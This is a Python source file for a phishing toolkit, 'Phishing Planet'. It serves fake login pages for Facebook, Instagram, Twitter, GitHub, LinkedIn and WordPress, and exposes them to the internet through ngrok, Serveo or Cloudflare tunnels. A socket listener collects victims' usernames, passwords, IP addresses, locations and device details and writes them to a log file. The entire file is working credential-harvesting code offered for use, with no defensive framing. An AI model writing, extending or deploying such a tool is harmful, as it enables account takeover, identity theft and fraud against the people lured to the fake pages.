import socket
import subprocess
import time
import os
import json
import threading

# Define login templates
TEMPLATES = {
    "1": {"name": "Facebook", "folder": "templates/facebook"},
    "2": {"name": "Instagram", "folder": "templates/instagram"},
    "3": {"name": "Twitter", "folder": "templates/twitter"},
    "4": {"name": "GitHub", "folder": "templates/github"},
    "5": {"name": "LinkedIn", "folder": "templates/linkedin"},
    "6": {"name": "WordPress", "folder": "templates/wordpress"},
}

# Server options
SERVERS = {
    "1": "Localhost",
    "2": "Ngrok",
    "3": "Serveo",
    "4": "Cloudflare"
}

LOG_FILE = "captured_log.json"

# Clear terminal
def clear_screen():
    os.system("cls" if os.name == "nt" else "clear")

# Display menu
def show_menu(options, title):
    clear_screen()
    print("_/-----------------------------------------------------------\_")
    print("|                       Phishing Planet                       |")
    print("|                     Made by Raiyan Planet                   |")
    print("|    Github:https://github.com/raiyanplanet/phishingplanet    |")
    print("---------------------------------------------------------------")
    print(f"[+] ----------  {title}  ----------")
    for key, value in options.items():
        print(f"[{key}] {value['name'] if isinstance(value, dict) else value}")
    print("[0] Exit")
    print("---------------------")

# Log data
def log_data(data):
    with open(LOG_FILE, "a") as file:
        file.write(json.dumps(data, indent=4) + "\n")

# Start PHP server
def start_php_server(folder):
    return subprocess.Popen(["php", "-S", "127.0.0.1:8000", "-t", folder])

# Start Ngrok tunnel
def start_ngrok():
    return subprocess.Popen(["ngrok", "http", "8000"])
    
# Start Serveo tunnel
def start_serveo():
    return subprocess.Popen(["ssh", "-R", "80:localhost:8000", "serveo.net"])
    
# Start Cloudflare tunnel
def start_cloudflare():
    return subprocess.Popen(["cloudflared", "tunnel", "--url", "http://127.0.0.1:8000"])


# Start socket server
def start_socket_server(port=5000):
    while True:
        try:
            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server.bind(("127.0.0.1", port))
            server.listen(5)
            return server
        except OSError:
            port += 1

# Start phishing server
def start_server(template, server_type):
    folder = TEMPLATES[template]['folder']
    clear_screen()
    print(f"Starting {TEMPLATES[template]['name']} Server on {SERVERS[server_type]}...")

    php_process = start_php_server(folder)
    time.sleep(2)  # Allow PHP server to start

    if server_type == "2":
        tunnel = start_ngrok()
        time.sleep(5)
    elif server_type == "3":
        tunnel = start_serveo()
        time.sleep(5)
    elif server_type == "4":
        tunnel = start_cloudflare()
        time.sleep(5)

    socket_server = start_socket_server()
    print(f"[+] Server started at: http://127.0.0.1:8000")
    print("\n[+] Waiting for login credentials.....\n")

    try:
        while True:
            conn, addr = socket_server.accept()
            with conn:
                data = conn.recv(1024)
                if data:
                    parsed_data = json.loads(data.decode())
                    username, password = parsed_data["username"], parsed_data["password"]
                    device_info = parsed_data["device_info"]

                    log_entry = {
                        "Username": username,
                        "Password": password,
                        "IP Address": device_info.get("IP Address", "Unknown"),
                        "Location": device_info.get("Location", "Unknown"),
                        "Browser": device_info.get("Browser", "Unknown"),
                        "Device Info": device_info.get("Device Info", "Unknown"),
                    }

                    print(json.dumps(log_entry, indent=4))
                    log_data(log_entry)
    except KeyboardInterrupt:
        print("\nStopping servers......")
        php_process.terminate()
        if server_type == "2":
            tunnel.terminate()
        socket_server.close()

# Main menu loop
while True:
    show_menu(TEMPLATES, "Select a Login Template")
    choice = input("[+] Enter your choice: ")

    if choice == "0":
        print("Exiting program...")
        break
    elif choice in TEMPLATES:
        show_menu(SERVERS, "Select a Server Type")
        server_choice = input("[+] Enter server type: ")

        if server_choice == "0":
            continue
        elif server_choice in SERVERS:
            start_server(choice, server_choice)
        else:
            print("Invalid server choice!")
            time.sleep(2)
    else:
        print("Invalid template choice!")
        time.sleep(2)
